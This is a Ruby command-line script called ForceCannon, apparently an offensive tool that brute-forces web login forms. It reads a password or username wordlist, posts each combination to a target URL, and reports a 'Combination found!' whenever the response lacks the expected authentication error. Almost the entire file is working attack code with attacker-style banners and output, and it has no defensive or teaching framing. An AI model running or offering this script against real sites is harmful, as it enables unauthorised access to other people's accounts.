#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'optparse'

class ForceCannon

    def self.parse_options

        options = {}
        OptionParser.new do |opt|

            opt.banner = "Usage: ./app.rb [-t/--target] [-u/--username] [-P/--Password_list]"
            opt.on("-t", "--target TARGET", "Target IP address or domain name") do |target|

                options[:target] = target
            end
            opt.on("-u", "--username USER_VALUE", "Username value") do |username|

                options[:username] = username
            end
            opt.on("-p", "--password PASSWORD_VALUE", "Password value") do |password|

                options[:password] = password
            end
            opt.on("-U", "--Users_list WORDLIST", "Wordlist of Usernames") do |usersList|

                options[:usersList] = usersList
            end
            opt.on("-P", "--Password_list WORDLIST", "Wordlist of Passwords") do |passList|

                options[:passList] = passList
            end
            opt.on("-e", "--error_msg AUTH_ERROR_MSG", "Authentication error message to check if the attack was successful") do |error|

                options[:error] = error
            end
            opt.on("-h", "--help", "show this help message and exit") do
                
                puts opt
                exit
            end
        end.parse!

        options
    end

    def bruteforce_post_HTTP(options, target, value, error_msg, wordlist)

        banner = File.read("logo_cannon.txt")
        puts banner
        
        puts "---" * 15
        puts "[?] Initializing BruteForce Attack\n"
        puts "---" * 15 + "\n\n"

        puts "===" * 20
        print "[?] Name attribute (Username): "
        user_data = $stdin.gets.chomp
        puts "===" * 20
        print "[?] Name attribute (Password): "
        pass_data = $stdin.gets.chomp
        puts "===" * 20 + "\n\n"

        puts "---" * 15 
        puts "[!] Attacking..."
        puts "---" * 15

        url = URI(target)
        status = Net::HTTP.get_response(url)

        if status.code.to_i == 200 || status.code.to_i == 302
            File.open(wordlist, "r") do |list|
                list.each_line do |line|

                    if options[:usersList].nil? && !options[:passList].empty?
                        parameters = {
                            user_data => value,
                            pass_data => line.chomp
                        }
                            
                        request = Net::HTTP.post_form(url, parameters)      
                        if request.body.include?(error_msg)
                            puts "\n[+] Testing with #{value} | #{line.chomp}"
                            
                        else
                            print "\n" + "***" * 25
                            print "\n[✓] Combination found! => User: #{value} | Password: #{line.chomp}\n"
                            puts "***" * 25 + "\n\n"
                            break
                        end
                    else
                        parameters = {
                            user_data => line.chomp,
                            pass_data => value
                        }
                        
                        request = Net::HTTP.post_form(url, parameters)
                        if request.body.include?(error_msg)
                            puts "\n[+] Testing with #{value} | #{line.chomp}"

                        else
                            print "\n" + "***" * 25
                            print "\n[✓] Combination found! => User: #{value} | Password: #{line.chomp}\n"
                            puts "***" * 25 + "\n\n"
                            break
                        end
                    end
                end
            end
        else
            puts "[X] The target is off\n"
        end
    end
end

options = ForceCannon.parse_options

if options[:target].nil?
    puts "\n[X] Select the target IP or domain name!\n"
    exit
else
    if options[:usersList].nil? && !options[:passList].empty?
        ForceCannon.new.bruteforce_post_HTTP(options, options[:target], options[:username], options[:error], options[:passList])
    else
        ForceCannon.new.bruteforce_post_HTTP(options, options[:target], options[:password], options[:error], options[:usersList])
    end
end
